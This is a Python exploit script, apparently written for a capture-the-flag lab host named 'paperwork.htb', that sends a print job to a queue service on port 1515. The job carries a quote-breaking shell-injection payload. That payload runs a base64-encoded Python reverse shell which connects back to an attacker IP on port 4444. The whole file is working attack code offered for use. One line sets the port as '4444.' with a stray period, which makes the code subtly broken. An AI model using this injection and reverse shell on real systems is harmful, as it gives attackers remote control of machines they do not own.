#!/usr/bin/env python3
import socket
import base64

HOST = "paperwork.htb"
PORT = 1515
QUEUE = "archive_intake"
LHOST = "10.10.14.15"        # Your attacker IP
LPORT = 4444. ## nc listner

# Reverse shell code (Python) – base64 encoded to avoid quoting issues
shell_code = f'''
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{LHOST}",{LPORT}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
'''.strip()
b64_shell = base64.b64encode(shell_code.encode()).decode()

# The payload: close the single quote, execute our shell, reopen the quote
payload = f"J'; python3 -c \"exec(__import__('base64').b64decode('{b64_shell}'))\"; echo '"

# Build the content: payload + newline
content = (payload + "\n").encode()
size = len(content) - 1  # server reads size+1 bytes

def recv_ack(sock):
    data = sock.recv(1)
    if not data:
        print("[-] Connection closed")
        return False
    if data != b"\x00":
        print("[-] Server rejected request")
        return False
    return True

with socket.create_connection((HOST, PORT)) as s:
    print("[+] Connected")
    # Send print job command + queue
    s.sendall(b"\x02" + QUEUE.encode() + b"\n")
    if not recv_ack(s):
        exit(1)
    print("[+] Queue accepted")

    # Send the malicious chunk: subcommand 2 + size
    chunk = b"\x02 " + str(size).encode() + b"\n"
    s.sendall(chunk)
    if not recv_ack(s):
        exit(1)
    print("[+] Chunk accepted, sending payload...")
    s.sendall(content)
    print("[+] Payload sent. Check your listener.")
